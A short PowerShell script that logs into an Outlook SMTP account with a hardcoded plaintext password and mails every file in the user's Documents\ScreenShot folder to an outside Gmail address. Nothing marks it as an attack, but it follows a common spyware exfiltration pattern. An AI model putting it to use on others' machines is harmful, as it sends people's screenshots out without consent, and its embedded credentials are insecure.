#Connection Details
$username="Terdemonstratie@hotmail.com"
$password="G3h31mw8tw00rd"
$smtpServer = "smtp-mail.outlook.com"
$msg = new-object Net.Mail.MailMessage

#SMTP connection
$smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 

#SSL tunnel to communicate   
$smtp.EnableSsl = $true

$smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)

#From Address
$msg.From = "Terdemonstratie@hotmail.com"

#To Address, Copy the below line for multiple recipients
$msg.To.Add("jeffstrat45045@gmail.com")

#Message Body
$msg.Body="Kijk naar aangehechte bestanden"

#Message Subject
$msg.Subject = "Email met meerdere printscreens"

#your file location
$files=Get-ChildItem "$env:USERPROFILE\Documents\ScreenShot\"

Foreach($file in $files)
{
Write-Host "Attaching File :- " $file
$attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
$msg.Attachments.Add($attachment)

}
$smtp.Send($msg)
write-host "	Mail Sent"
$attachment.Dispose();
$msg.Dispose();